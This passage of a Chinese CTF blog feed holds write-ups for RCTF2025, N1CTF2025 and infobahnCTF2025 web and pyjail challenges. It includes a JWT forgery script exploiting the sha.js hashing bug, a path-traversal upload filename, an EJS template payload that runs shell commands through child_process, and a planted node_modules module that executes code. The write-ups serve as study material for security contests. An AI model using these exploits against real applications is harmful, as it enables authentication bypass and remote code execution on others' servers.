class="hljs-string">&#x27;Location: /&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Auth::check() 是检查是否登录</p><p>Auth::type() 是查看用户的身份类型</p><p><img src="/2025/12/15/RCTF2025-photographer/image-20251215140857815.png" alt="image-20251215140857815"></p><p>配置文件中可以看到不同身份对应的数字</p><p>所以这里要求用户的身份类别对应的数字小于0，正常情况是2，所以我们继续分析系统是如何识别用户身份的</p><p>Auth::type()代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">type</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;type&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>那么user数组是怎么来的呢</p><p>app\middlewares\Auth.php存在如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">session_status</span>() === PHP_SESSION_NONE) &#123;<br>        <span class="hljs-title function_ invoke__">session_name</span>(<span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;session.name&#x27;</span>));<br>        <span class="hljs-title function_ invoke__">session_start</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$user</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">findById</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>他是调用User::findById函数，根据session中的user_id来的，继续跟进findById函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findById</span>(<span class="hljs-params"><span class="hljs-variable">$userId</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> DB::<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        -&gt;<span class="hljs-title function_ invoke__">leftJoin</span>(<span class="hljs-string">&#x27;photo&#x27;</span>, <span class="hljs-string">&#x27;user.background_photo_id&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;photo.id&#x27;</span>)<br>        -&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;user.id&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$userId</span>)<br>        -&gt;<span class="hljs-title function_ invoke__">first</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会返回id匹配的第一条记录，同时还返回了背景图的信息，问题就出在这里</p><p><a href="https://github.com/php/php-src/issues/20300">https://github.com/php/php-src/issues/20300</a></p><p>我们继续跟进分析一下原理</p><p>first函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">first</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">limit</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$results</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>();<br>    <span class="hljs-keyword">return</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$results</span>) ? <span class="hljs-variable">$results</span>[<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>是通过get方法来获取结果的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildSql</span>();<br>    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>    <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;bindings <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">is_int</span>(<span class="hljs-variable">$value</span>) ? SQLITE3_INTEGER : SQLITE3_TEXT;<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$type</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$rows</span> = [];<br>    <br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetchArray</span>(SQLITE3_ASSOC)) &#123;<br>        <span class="hljs-variable">$rows</span>[] = <span class="hljs-variable">$row</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rows</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>问题出现在fetchArray(SQLITE3_ASSOC)，根据php的官方文档</p><p><img src="/2025/12/15/RCTF2025-photographer/image-20251215141651172.png" alt="image-20251215141651172"></p><p>SQLITE3_ASSOC返回的数组是按列名索引的，加上这里的join的user表和photo表存在相同的type列，那么后者就会覆盖前者的数据，而我们是可以上传照片的，接下来分析一下photo表中的type是怎么获取的<img src="/2025/12/15/RCTF2025-photographer/image-20251215141951806.png" alt="image-20251215141951806"></p><p>直接从上传的文件的type中获取</p><p>那么我们的思路就是上传一张type为-1的图片，并设置为背景图，虽然这里的type”-1”是字符串类型，但是php的弱类型毕竟是满足“-1”&lt; 0的，最后访问superadmin即可</p><h1 id="总结"><a href="/2025/12/15/RCTF2025-photographer/#总结" class="headerlink" title="总结"></a>总结</h1><p>这题考察了SQLite3Result：：fetchArray处理join两个存在相同列名的表时的数据覆盖问题</p>]]></content>
    
    
    
    <tags>
      
      <tag>-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n1ct2025-wp</title>
    <link href="/2025/11/17/n1ctf2025-wp/"/>
    <url>/2025/11/17/n1ctf2025-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="/2025/11/17/n1ctf2025-wp/#前言" class="headerlink" title="前言"></a>前言</h1><p>n1的题目真难，又刷新了对自己的定位，最简单的一题考的js，但是对js不是很熟悉</p><h1 id="eezzjs"><a href="/2025/11/17/n1ctf2025-wp/#eezzjs" class="headerlink" title="eezzjs"></a>eezzjs</h1><p>这题有两个点</p><ul><li>首先是登录，因为没有注册功能，只有一个admin用户，所以只能想办法得到一个合法的token来进行登录</li><li>登录成功之后可以进行文件上传，但要求不能包含字符串’js’</li></ul><p>不难注意到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">serveIndex</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> templ = req.<span class="hljs-property">query</span>.<span class="hljs-property">templ</span> || <span class="hljs-string">&#x27;index&#x27;</span>;<br>    <span class="hljs-keyword">var</span> lsPath = path.<span class="hljs-title function_">join</span>(__dirname, req.<span class="hljs-property">path</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        res.<span class="hljs-title function_">render</span>(templ, &#123;<br>            <span class="hljs-attr">filenames</span>: fs.<span class="hljs-title function_">readdirSync</span>(lsPath),<br>            <span class="hljs-attr">path</span>: req.<span class="hljs-property">path</span><br>        &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error rendering page&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以指定文件进行渲染，如果我们能上传一个.ejs文件，就可以实现rce了</p><p>关键是如何伪造出合法的token</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">signJWT</span> = (<span class="hljs-params">payload, &#123; expiresIn &#125; = &#123;&#125;, secret = JWT_SECRET</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> header = &#123; <span class="hljs-attr">alg</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>, <span class="hljs-attr">typ</span>: <span class="hljs-string">&#x27;JWT&#x27;</span> &#125;;<br>    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() / <span class="hljs-number">1000</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(payload)<br>    <span class="hljs-keyword">const</span> body = &#123; ...payload, <span class="hljs-attr">length</span>:payload.<span class="hljs-property">username</span>.<span class="hljs-property">length</span>,<span class="hljs-attr">iat</span>: now &#125;;<br>    <span class="hljs-keyword">if</span> (expiresIn) &#123;<br>        body.<span class="hljs-property">exp</span> = now + expiresIn;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> [<br>        <span class="hljs-title function_">toBase64Url</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header)),<br>        <span class="hljs-title function_">toBase64Url</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(body)),<br>        <span class="hljs-title function_">sha256</span>(...[<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header), body, secret])<br>    ].<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>签名的时候用的密钥是随机数，我们没办法获得，所以一直想不到如何伪造这个token</p><p>赛后看wp发现，如果debug一下，执行npm install 就会发现使用的sha.js版本是有cve的</p><p>[<a href="https://github.com/advisories/GHSA-95m3-7q98-8xr5">CVE-2025-9288</a>]</p><p><img src="/2025/11/17/n1ctf2025-wp/image-20251117183312766.png" alt="image-20251117183312766"></p><p>一个简单的payload就可以很直观的理解这个漏洞</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt; <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sha.js&#x27;</span>)(<span class="hljs-string">&#x27;sha256&#x27;</span>)<span class="hljs-selector-class">.update</span>(<span class="hljs-string">&#x27;foo&#x27;</span>)<span class="hljs-selector-class">.digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-string">&#x27;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae&#x27;</span><br>&gt; <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sha.js&#x27;</span>)(<span class="hljs-string">&#x27;sha256&#x27;</span>)<span class="hljs-selector-class">.update</span>(<span class="hljs-string">&#x27;fooabc&#x27;</span>)<span class="hljs-selector-class">.update</span>(&#123;length:-<span class="hljs-number">3</span>&#125;)<span class="hljs-selector-class">.digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-string">&#x27;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae&#x27;</span><br></code></pre></td></tr></table></figure><p>也就是如果我们传给update的参数是一个对象，他就会尝试将他转换成buffer，此时可以利用<code>length:</code>来控制被哈希的字符串的长度</p><p>如果我们控制length使得被hash的内容长度变成零，那么在密钥长度相同的情况下，得到的哈希值是相同的，于是就得到了我们的payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sha = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sha.js&#x27;</span>)<br><span class="hljs-keyword">const</span> &#123;verifyJWT&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./auth&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">sha256</span> = (<span class="hljs-params">...messages</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> hash = <span class="hljs-title function_">sha</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>)<br>    messages.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;[DEBUG] m =&#x27;</span>, m); hash.<span class="hljs-title function_">update</span>(m)&#125;)<br>    <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>&#125;;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">toBase64Url</span> = (<span class="hljs-params">input</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> buffer = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">isBuffer</span>(input) ? input : <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(input);<br>    <span class="hljs-keyword">return</span> buffer<br>        .<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>)<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\+/g</span>, <span class="hljs-string">&#x27;-&#x27;</span>)<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;_&#x27;</span>)<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/=+$/</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;;<br><span class="hljs-keyword">const</span> header = &#123;<br>    <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>    <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;;<br><span class="hljs-keyword">const</span> len=-(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header).<span class="hljs-property">length</span>+<span class="hljs-number">18</span>);   <span class="hljs-comment">// username: &#x27;admin&#x27;   </span><br><span class="hljs-keyword">var</span> payload = &#123;<span class="hljs-attr">username</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-attr">length</span>:len&#125;;<br><span class="hljs-keyword">const</span> secret = <span class="hljs-string">&#x27;q&#x27;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">18</span>);<span class="hljs-comment">//被哈希的内容为空时，哈希值只和密钥长度有关</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">sha256</span>(...[<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header), payload, secret]));<br><span class="hljs-keyword">const</span> body = <span class="hljs-string">&#x27;&#123;&quot;length&quot;:-45,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span>;<br>token = [<br>        <span class="hljs-title function_">toBase64Url</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header)),<br>        <span class="hljs-title function_">toBase64Url</span>(body),<br>        <span class="hljs-title function_">sha256</span>(...[<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(header), payload, secret])<br>    ].<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">verifyJWT</span>(token,secret));<br></code></pre></td></tr></table></figure><p>运行得到token</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">token</span><span class="hljs-operator">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZW5ndGgiOi00NSwidXNlcm5hbWUiOiJhZG1pbiJ9.<span class="hljs-number">674</span>dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1<br></code></pre></td></tr></table></figure><p>现在登录的问题解决了，我们要想办法实现rce</p><p>waf</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> &#123;filedata,filename&#125;=req.<span class="hljs-property">body</span>;<br><span class="hljs-keyword">var</span> ext = path.<span class="hljs-title function_">extname</span>(filename).<span class="hljs-title function_">toLowerCase</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/js/i</span>.<span class="hljs-title function_">test</span>(ext)) &#123;<br>    <span class="hljs-keyword">return</span>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Denied filename&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">var</span> filepath = path.<span class="hljs-title function_">join</span>(uploadDir,filename);<br></code></pre></td></tr></table></figure><p>可以用..来绕过     filename &#x3D; ..&#x2F;..&#x2F;app&#x2F;views&#x2F;exploit.ejs&#x2F;a&#x2F;..</p><p>这样后缀名就为空，不会触发waf，同时文件也能上传到正确的位置,借用一下佬的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">ssti_payload = <span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;%</span><br><span class="hljs-string">  const cp = (Function(&#x27;return process&#x27;))().mainModule.require(&#x27;child_process&#x27;);</span><br><span class="hljs-string">  const data = cp.execSync(&#x27;cat /ffffffflag&#x27;, &#x27;utf8&#x27;);</span><br><span class="hljs-string">%&gt;</span><br><span class="hljs-string">&lt;pre&gt;&lt;%= data %&gt;&lt;/pre&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>r = c.post(<br>    <span class="hljs-string">&quot;/upload&quot;</span>,<br>    json=<span class="hljs-built_in">dict</span>(<br>        filename=<span class="hljs-string">&quot;../../app/views/exploit.ejs/a/..&quot;</span>,<br>        filedata=base64.b64encode(ssti_payload).decode(),<br>    ),<br>)<br></code></pre></td></tr></table></figure><p>最后再&#x2F;?templ&#x3D;exploit.ejs    就可以实现任意代码执行</p><p>但这并不是这题的预期解，nodejs的文档中有一个<a href="https://nodejs.org/api/modules.html#requireid">说明</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If <span class="hljs-keyword">the</span> exact filename is <span class="hljs-keyword">not</span> found, <span class="hljs-keyword">then</span> Node.js will attempt <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> <span class="hljs-keyword">the</span> required filename <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> added extensions: .js, .json, <span class="hljs-keyword">and</span> <span class="hljs-keyword">finally</span> .node. When loading <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> that has <span class="hljs-keyword">a</span> different <span class="hljs-built_in">extension</span> (e.g. .cjs), its full name must be passed <span class="hljs-built_in">to</span> <span class="hljs-built_in">require</span>(), including its <span class="hljs-built_in">file</span> <span class="hljs-built_in">extension</span> (e.g. <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./file.cjs&#x27;</span>)).<br></code></pre></td></tr></table></figure><p>也就是require一个文件的时候这个文件没找到，那么他就会尝试给他换不同的后缀名（js，json，node）</p><p>我们这里就可以上传.node文件来实现rce</p><p>discord上还有一个佬的做法是，上传一个pwned文件到&#x2F;app&#x2F;node_modules&#x2F;pwned</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&#123;<span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;../node_modules/pwned&quot;</span>,<span class="hljs-string">&quot;filedata&quot;</span>:<span class="hljs-string">&quot;ZnVuY3Rpb24gX19leHByZXNzKCkgewogICAgY29uc29sZS5sb2coJ3B3bmVkYicpOwp9Cgptb2R1bGUuZXhwb3J0cyA9IHsgX19leHByZXNzIH07&quot;</span>&#125;<br><br><span class="hljs-built_in">decode</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">__express</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;pwnedb&#x27;</span>);<br>&#125;<br><br>module.exports = &#123; __express &#125;;<br></code></pre></td></tr></table></figure><ul><li>因为它存放在 <code>node_modules</code> 目录下，任何 <code>require(&#39;pwned&#39;)</code> 调用都会加载这个文件。</li><li>它导出了一个名为 <code>__express</code> 的函数。在 Express 生态中，一个模块如果导出了 <code>__express</code> 函数，就意味着它可以作为一个视图引擎被 Express 加载和使用。</li></ul><p>这时再上传一个任意的1.pwned文件，随后使用?templ&#x3D;1.pwned进行渲染，此时Express不知道如何处理.pwned文件，于是它会尝试加载一个名为 <code>pwned</code> 的视图引擎模块。它的查找逻辑是：<code>require(&#39;pwned&#39;)</code>。因此就调用了我们的__express函数，这样就可以执行任意代码了</p>]]></content>
    
    
    
    <tags>
      
      <tag>-wp -复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>infobahnctf2025-wp</title>
    <link href="/2025/11/09/infobahnctf2025-wp/"/>
    <url>/2025/11/09/infobahnctf2025-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="/2025/11/09/infobahnctf2025-wp/#前言" class="headerlink" title="前言"></a>前言</h1><p>又是忙碌的一周，考完试找了个国外的比赛打打，主要是学了下xss</p><h1 id="pyjail"><a href="/2025/11/09/infobahnctf2025-wp/#pyjail" class="headerlink" title="pyjail"></a>pyjail</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> contextlib<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">code</span>):<br>    buf = io.StringIO()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> contextlib.redirect_stdout(buf):<br>            <span class="hljs-built_in">exec</span>(code, &#123;&#125;)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> buf.getvalue() <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br>code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your solution: &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(code) &gt; <span class="hljs-number">15</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Code too long&quot;</span>)<br>    exit()<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">set</span>(code) &lt;= <span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz &quot;</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid characters&quot;</span>)<br>    exit()<br>result = run(code)<br><span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error&quot;</span>)<br>    exit()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(result) &gt; <span class="hljs-number">500</span>:<br>    <span class="hljs-built_in">print</span>(FLAG)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output too short&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>要求输入的代码长度小于15，并且只包含小写字母和空格，同时输出的内容长度要大于500</p><p>这里直接使用‘python之禅’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> this<br></code></pre></td></tr></table></figure><p><img src="/2025/11/09/infobahnctf2025-wp/image-20251109235059073.png" alt="image-20251109235059073"></p><h1 id="bitset"><a href="/2025/11/09/infobahnctf2025-wp/#bitset" class="headerlink" title="bitset"></a>bitset</h1><p>功能：和常见的xss差不多，访问&#x2F;bot?url&#x3D;xxx,bot就会访问</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:6969/?url=xxx</span><br></code></pre></td></tr></table></figure><p>6969端口的服务（关键代码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 